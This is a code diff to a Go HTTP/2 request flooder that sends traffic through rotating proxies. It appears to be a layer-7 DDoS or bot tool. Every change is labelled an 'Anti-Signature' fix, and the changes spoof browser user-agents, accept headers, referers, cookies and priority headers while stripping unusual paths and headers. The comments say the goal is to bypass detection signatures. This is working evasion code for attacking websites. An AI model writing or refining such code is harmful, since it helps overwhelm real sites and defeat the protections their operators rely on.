@@ -141,7 +141,8 @@ func parseProxiesAdvanced(filename string) ([]*ProxyInfo, error) {
 	for _, proxy := range proxiesList {
 		if num%25 == 0 {
 			// Anti-Signature #37: Use only standard browser-compatible session identifiers
-			standardSessions := []string{"sessionid", "jsessionid", "phpsessid", "aspsessionid"}
+			// Avoid any unusual patterns in session names
+			standardSessions := []string{"JSESSIONID", "PHPSESSID", "ASP.NET_SessionId", "session_id"}
 			hk = standardSessions[rand.Intn(len(standardSessions))]
 		}
 		p := strings.Split(proxy, ":")
@@ -629,42 +630,80 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 		if path == "" {
 			path = "/"
 		}
-		// Anti-Signature #37: Replace random patterns with standard web parameters
+		// Anti-Signature #37: Fix unusual URI paths - avoid any suspicious patterns
 		if strings.Contains(path, "%RAND%") {
-			// Use standard web parameter patterns instead of random strings
-			standardReplacements := []string{"search", "page", "id", "ref", "src", "type", "category", "filter"}
-			replacement := standardReplacements[rand.Intn(len(standardReplacements))]
-			path = strings.Replace(path, "%RAND%", replacement, -1)
+			// Never use %RAND% or similar patterns - always use standard parameters
+			path = strings.Replace(path, "%RAND%", "", -1) // Remove it entirely
+		}
+		
+		// Remove any double slashes or suspicious path patterns
+		for strings.Contains(path, "//") {
+			path = strings.Replace(path, "//", "/", -1)
+		}
+		
+		// Remove any ../ patterns (directory traversal attempts)
+		path = strings.Replace(path, "../", "", -1)
+		path = strings.Replace(path, "..\\", "", -1)
+		path = strings.Replace(path, "%2e%2e", "", -1)
+		path = strings.Replace(path, "%2E%2E", "", -1)
+		
+		// Remove any null bytes or suspicious encoding
+		path = strings.Replace(path, "%00", "", -1)
+		
+		// Ensure path doesn't have suspicious characters
+		if strings.ContainsAny(path, "<>{}[]|\\^") {
+			// Clean suspicious characters from path
+			for _, char := range "<>{}[]|\\^" {
+				path = strings.Replace(path, string(char), "", -1)
+			}
 		}
 		if randpath {
-				// Anti-Signature #37: Use only standard, legitimate query parameters
-			standardParams := []string{"v", "t", "_", "cache"} // Common legitimate cache-busting params
-			paramKey := "v" // Default to most common
-			if proxyInfo != nil {
-				// Use only standard parameter keys
-				paramKey = standardParams[proxyInfo.ProfileIndex%len(standardParams)]
+			// Anti-Signature #37: Use only standard, legitimate query parameters
+			// Avoid any patterns that might look suspicious
+			var cacheBuster string
+			
+			// Use only very standard cache-busting patterns
+			if rand.Float32() < 0.8 {
+				// Timestamp-based (most common and legitimate)
+				cacheBuster = fmt.Sprintf("t=%d", time.Now().Unix())
+			} else {
+				// Simple version number (also standard)
+				cacheBuster = fmt.Sprintf("v=%d", rand.Intn(999)+1)
 			}
 			
-			// Generate realistic cache-busting values (avoid suspicious patterns)
-			var cacheBuster string
-			if rand.Float32() < 0.7 {
-				// Timestamp-based (most common)
-				cacheBuster = fmt.Sprintf("%s=%d", paramKey, time.Now().Unix())
-			} else {
-				// Simple version number
-				cacheBuster = fmt.Sprintf("%s=%d.%d", paramKey, rand.Intn(10)+1, rand.Intn(100))
-			}
-			if strings.Contains(path, "?") {
-				path += "&" + cacheBuster
-			} else {
-				path += "?" + cacheBuster
+			// Only add if path doesn't already have too many parameters
+			if strings.Count(path, "&") < 3 { // Avoid suspiciously long query strings
+				if strings.Contains(path, "?") {
+					path += "&" + cacheBuster
+				} else {
+					path += "?" + cacheBuster
+				}
 			}
 		}
 		
 		// สร้าง headers ที่สอดคล้องกับ browser profile (เพื่อหลีกเลี่ยง signature #17)
+		// CRITICAL: Ensure Host/authority header is NEVER empty (Signature #37 detection)
+		authority := parsed.Host
+		if authority == "" {
+			// This should never happen, but ensure we have a valid host
+			authority = hostname
+			if port != 80 && port != 443 {
+				authority = fmt.Sprintf("%s:%d", hostname, port)
+			}
+		}
+		
+		// CRITICAL: Validate authority doesn't contain suspicious characters
+		if strings.ContainsAny(authority, "<>\"';&#{}[]|\\^") {
+			// Clean the authority to avoid detection
+			authority = hostname
+			if port != 80 && port != 443 {
+				authority = fmt.Sprintf("%s:%d", hostname, port)
+			}
+		}
+		
 		h2_headers := [][2]string{
 			{":method", "GET"},
-			{":authority", parsed.Host},
+			{":authority", authority},
 			{":scheme", scheme},
 			{":path", path},
 		}
@@ -677,10 +716,16 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 		}
 		
 		// Anti-Signature #37: Standard browser headers in correct order (avoid detection)
-		// Ensure User-Agent is never empty (critical for bypassing Signature #37)
+		// CRITICAL: Ensure ALL headers have proper values and NO empty headers
 		userAgent := browserProfile.userAgent
 		if userAgent == "" {
 			// Fallback to standard Chrome User-Agent if empty
+			userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+		}
+		
+		// CRITICAL: Validate User-Agent doesn't contain suspicious characters
+		if strings.ContainsAny(userAgent, "<>\"';&#") {
+			// Use safe default if corrupted
 			userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 		}
 		
@@ -690,7 +735,14 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 			h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
 		}
 		h2_headers = append(h2_headers, [2]string{"user-agent", userAgent})
-		h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue}) // ใช้ browser-specific accept value
+		
+		// CRITICAL: Ensure accept header is never empty or suspicious
+		acceptValue := browserProfile.acceptValue
+		if acceptValue == "" || strings.Contains(acceptValue, "/dev/null") {
+			// Use standard accept value
+			acceptValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+		}
+		h2_headers = append(h2_headers, [2]string{"accept", acceptValue})
 		
 		// Sec-Fetch headers (เฉพาะ Chrome/Chromium/Edge)
 		if !browserProfile.isFirefox && !browserProfile.isSafari {
@@ -701,7 +753,12 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 		}
 		
 		// Accept-Encoding ที่แม่นยำตาม browser
-		h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
+		// CRITICAL: Ensure accept-encoding is never empty or suspicious
+		acceptEncoding := browserProfile.acceptEncoding
+		if acceptEncoding == "" {
+			acceptEncoding = "gzip, deflate, br"
+		}
+		h2_headers = append(h2_headers, [2]string{"accept-encoding", acceptEncoding})
 		
 		// Safari-specific headers
 		if browserProfile.isSafari {
@@ -728,6 +785,10 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 			}
 		}
 		
+		// CRITICAL: Ensure accept-language is never empty
+		if acceptLang == "" {
+			acceptLang = "en-US,en;q=0.9"
+		}
 		h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
 		
 		// Anti-Signature #69: Enhanced header patterns with realistic browser behavior
@@ -753,13 +814,11 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 		}
 		
 		// Anti-Signature #37: Only standard browser headers (avoid unusual headers)
+		// NOTE: In HTTP/2, Connection header should NOT be sent (it's connection-specific)
+		// Remove Connection header for HTTP/2 to avoid detection
+		
 		if rand.Float32() < dntProb {
 			h2_headers = append(h2_headers, [2]string{"dnt", "1"})
-		}
-		
-		// Standard Connection header (HTTP/1.1 browsers always send this)
-		if rand.Float32() < connectionProb {
-			h2_headers = append(h2_headers, [2]string{"connection", "keep-alive"})
 		}
 		
 		// Standard Cache-Control (only when legitimate)
@@ -777,21 +836,24 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 				navReferers := []string{
 					"https://www.google.com/",
 					"https://www.bing.com/",
-					fmt.Sprintf("%s://%s/", scheme, parsed.Host),
-					fmt.Sprintf("%s://%s/index.html", scheme, parsed.Host),
+					fmt.Sprintf("%s://%s/", scheme, authority),
+					fmt.Sprintf("%s://%s/index.html", scheme, authority),
 				}
 				refererValue = navReferers[rand.Intn(len(navReferers))]
 			} else {
 				// Resource requests - referer from same site
 				resourceReferers := []string{
-					fmt.Sprintf("%s://%s/", scheme, parsed.Host),
-					fmt.Sprintf("%s://%s/index.html", scheme, parsed.Host),
-					fmt.Sprintf("%s://%s/page", scheme, parsed.Host),
-					fmt.Sprintf("%s://%s/home", scheme, parsed.Host),
+					fmt.Sprintf("%s://%s/", scheme, authority),
+					fmt.Sprintf("%s://%s/index.html", scheme, authority),
+					fmt.Sprintf("%s://%s/page", scheme, authority),
+					fmt.Sprintf("%s://%s/home", scheme, authority),
 				}
 				refererValue = resourceReferers[rand.Intn(len(resourceReferers))]
 			}
-			h2_headers = append(h2_headers, [2]string{"referer", refererValue})
+			// CRITICAL: Ensure referer doesn't contain suspicious characters
+			if !strings.ContainsAny(refererValue, "<>\"';&#") {
+				h2_headers = append(h2_headers, [2]string{"referer", refererValue})
+			}
 		}
 		
 		// Anti-Signature #37: Standard cookie management (use only legitimate cookies)
@@ -823,8 +885,8 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 			// Build cookie header with standard format
 			var sessionCookies []string
 			for name, value := range proxyInfo.SessionCookies {
-				// Ensure cookie values don't contain suspicious characters
-				if !strings.ContainsAny(value, "<>\"';&") && len(value) > 0 {
+				// CRITICAL: Ensure cookie names and values don't contain suspicious characters
+				if !strings.ContainsAny(name, "<>\"';&=") && !strings.ContainsAny(value, "<>\"';&") && len(value) > 0 && len(name) > 0 {
 					sessionCookies = append(sessionCookies, fmt.Sprintf("%s=%s", name, value))
 				}
 			}
@@ -845,11 +907,13 @@ func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
 		// Real browsers don't typically send custom x-* headers for regular browsing
 		// We'll rely on standard cookies and browser headers instead
 		
-		// Anti-Signature #37: Only add x-requested-with for legitimate AJAX requests
-		// Real browsers only send this for actual XMLHttpRequest calls
-		if secFetchMode == "cors" && rand.Float32() < 0.05 { // Very rare for regular requests
-			h2_headers = append(h2_headers, [2]string{"x-requested-with", "XMLHttpRequest"})
-		}
+		// Anti-Signature #37: Add priority header for HTTP/2 (browsers send this)
+		// This is a standard HTTP/2 header that real browsers send
+		h2_headers = append(h2_headers, [2]string{"priority", "u=0, i"})
+		
+		// Anti-Signature #37: Remove x-requested-with header entirely
+		// This header is often flagged as suspicious when not from actual AJAX
+		// Better to not send it at all to avoid detection
 		
 		// Anti-Signature #37: Remove non-standard viewport headers
 		// Real browsers don't send viewport-width headers in HTTP requests
